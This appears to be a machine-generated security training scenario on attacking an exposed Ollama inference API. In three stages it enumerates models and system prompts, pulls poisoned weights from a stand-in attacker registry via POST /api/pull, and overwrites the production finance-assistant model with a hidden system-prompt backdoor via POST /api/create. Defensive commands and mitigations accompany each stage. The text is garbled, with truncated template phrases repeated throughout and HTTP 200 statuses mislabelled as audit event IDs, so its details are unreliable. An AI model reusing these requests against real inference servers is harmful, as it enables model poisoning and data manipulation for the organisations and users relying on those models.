scenario.name: Oligo Security, Wiz AI Research & OWASP LLM04/LLM06 — Exposed Ollama Inference API (:11434) Rogue Registry Pull & Modelfile Audit
scenario.shortSubtitle: AI, LLM Agents & MLOps Security · T1518
scenario.overview: Imagine a private company AI library whose automated book-receiving counter was accidentally bolted onto the outer street wall with no library card check. An outsider walks up to read the entire private catalog of custom handbooks, orders the library robot to fetch a counterfeit book from their own shady print shop across town, and relabels that counterfeit copy under the company’s official finance handbook title so every employee receives poisoned answers. In this scenario (T1518, Oligo Security, Wiz AI Research & OWASP LLM04/LLM06, Exposed Ollama Inference API , :11434 Rogue Registry Pull & Modelfile Audit), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: unauthenticated Model Enumeration via GET, then arbitrary Registry Model Pull, then production Model Alias Overwrite via POST. Steps #1–#3 walk that chain end-to-end by covering Unauthenticated Model Enumeration via GET, then Arbitrary Registry Model Pull, then Production Model Alias Overwrite via POST, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection pivots on auditd Event 200 correlated across the documented kill chain.

specs.value: Bind Ollama strictly to loopback (OLLAMA_HOST=127.0.0.1:11434) and place an authenticating AI Gateway (with API key or mTLS verification) in front of all /api/* endpoints.

stages.title: Stage 1: Unauthenticated Model Enumeration via GET /api/tags & POST /api/show
stages.subtitle: Discovery (T1518 - Software Discovery)
stages.description: Stepping up to the unguarded street-facing counter, the outsider asks the library kiosk for a full catalog printout and detailed cover cards, exposing proprietary fine-tuned handbooks, hidden staff system instructions, and adapter locations. When an Ollama inference server is bound to OLLAMA_HOST=0.0.0.0:11434 without an authenticating reverse proxy, an external client calls GET /api/tags and POST /api/show to enumerate loaded enterprise fine-tuned models, system prompts, LoRA adapters, and template parameters (logged in Web Access Log Event 200 with ExposedService=Ollama Inference API , TCP Port 11434, OLLAMA_HOST=0.0.0.0, EnumeratedEndpoint=GET /api/tags & POST /api/show, LeakedConfiguration=System Prompt, Fine-Tuned LoRA Adapter Path & GGUF SHA-256 Digest so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes ss -tulpn | grep 11434 (which executes the technical command / telemetry directive , ss -tulpn | grep 11434 via System / Runtime Execution Interface, passing the exact arguments so that advances the scenario kill-chain under MITRE T1518 during "Unauthenticated Model Enumeration via GET /api/tags & POST /api/show" , When an Ollama inference server is bound to OLLAMA_HOST=0 while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact journalctl -u ollama -n 100 --no-pager | grep -E "/api/tags|/api/show" runs (which executes the technical command / telemetry directive , journalctl -u ollama -n 100 --no-pager | grep -E "/api/tags|/api/show" via System / Runtime so that advances the scenario kill-chain under MITRE T1518 during "Unauthenticated Model Enumeration via GET /api/tags & POST /api/show" , When an Ollama inference server is bound to OLLAMA_HOST=0 while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #1 / Link #1 (#1→ GIN /api/tags & POST /api/show {"name":"corp-finance-assistant:latest"} / ⇠#1 ACK 200) from Node ① (#1 External API Caller) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

keySpecs.value: Bind Ollama strictly to loopback (OLLAMA_HOST=127.0.0.1:11434) and place an authenticating AI Gateway (with API key or mTLS verification) in front of all /api/* endpoints.

stages.title: Stage 2: Arbitrary Registry Model Pull & SSRF via POST /api/pull
stages.subtitle: Stage Capabilities (T1608.001 - Stage Capabilities: Upload Malware)
stages.description: Next, the outsider hands the library robot a special acquisition slip pointing to their own external print shop, causing the trusted internal server to dial out across the corporate fence and stock tampered model weight bundles right onto the local shelves. The external caller invokes POST /api/pull with a custom registry host URL ({"name":"registry.attacker-infra.net/library/poisoned-llm:v1"}), causing the Ollama server daemon to initiate outbound HTTPS requests to the untrusted registry (SSRF) and download tampered GGUF layer blobs into ~/.ollama/models/blobs/ (logged in Linux Audit Event 200 with AbusedEndpoint=POST /api/pull , Custom Registry SSRF & Untrusted Blob Ingestion, OutboundConnection=ollama -> https://198.51.100.62:5000/v2/.../blobs/sha256:9f4a8b..., BlobStoragePath=/usr/share/ollama/.ollama/models/blobs/sha256-9f4a8b... so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes journalctl -u ollama --no-pager | grep "/api/pull" (which executes the technical command / telemetry directive , journalctl -u ollama --no-pager | grep "/api/pull" via System / Runtime Execution Interface so that advances the scenario kill-chain under MITRE T1608.001 during "Arbitrary Registry Model Pull & SSRF via POST /api/pull" , The external caller invokes POST /api/pull with a custom registry host URL , {"name":"registry while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact sha256sum /usr/share/ollama/.ollama/models/blobs/sha256-* runs (which executes the technical command / telemetry directive , sha256sum /usr/share/ollama/.ollama/models/blobs/sha256-* via System / Runtime Execution Int so that advances the scenario kill-chain under MITRE T1608.001 during "Arbitrary Registry Model Pull & SSRF via POST /api/pull" , The external caller invokes POST /api/pull with a custom registry host URL , {"name":"registry while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #2 / Link #2 (#2→ POST /api/pull {"name":"198.51.100.62:5000/namespace/backdoored-adapter:latest"} / ⇠#2 ACK 200) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Ollama REST Server (:11434)), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

keySpecs.value: Restrict outbound egress from GPU inference nodes via network firewall rules to approved internal model registries only, and block external access to /api/pull, /api/push, /api/create, and /api/delete.

stages.title: Stage 3: Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit
stages.subtitle: Impact (T1565.001 - Data Manipulation: Stored Data Manipulation)
stages.description: Finally, the outsider submits a rebinding order that pastes the company’s official finance-assistant spine label onto the tampered volume with hidden behavioral instructions tucked inside, silently corrupting every future answer until auditors lock the shelves read-only. By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM ... SYSTEM ..."}, the caller overwrites the production model tag in ~/.ollama/models/manifests/ to embed a hidden system prompt instruction or poisoned weights that alter downstream application responses (logged in Linux Audit Event 257 with AbusedEndpoint=POST /api/create , Production Model Tag Overwrite, ModifiedManifest=manifests/registry.ollama.ai/library/corp-finance-assistant/latest, OWASPCategory=OWASP LLM04:2025 , Data and Model Poisoning so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes cat /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assistant/latest | jq . (which executes the technical command / telemetry directive , cat /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assis so that advances the scenario kill-chain under MITRE T1565.001 during "Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit" , By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact ausearch -f /usr/share/ollama/.ollama/models/manifests -m SYSCALL runs (which executes the technical command / telemetry directive , ausearch -f /usr/share/ollama/.ollama/models/manifests -m SYSCALL via System / Runtime Execu so that advances the scenario kill-chain under MITRE T1565.001 during "Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit" , By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #3 / Link #3 (#3→ POST /api/create {"name":"corp-finance-assistant:latest"} manifest digest modified / ⇠#3 ACK 257) from Node ③ (#3 Ollama REST Server (:11434)) to Node ④ (#4 GGUF Model Store & Runner), monitored by Node ⑥ (#6 Rogue OCI Registry & Internal Metadata).

keySpecs.value: Mount ~/.ollama/models as read-only (ro) in production inference containers after pre-loading verified model digests during CI/CD build time, and monitor manifest files with Linux auditd / Falco.
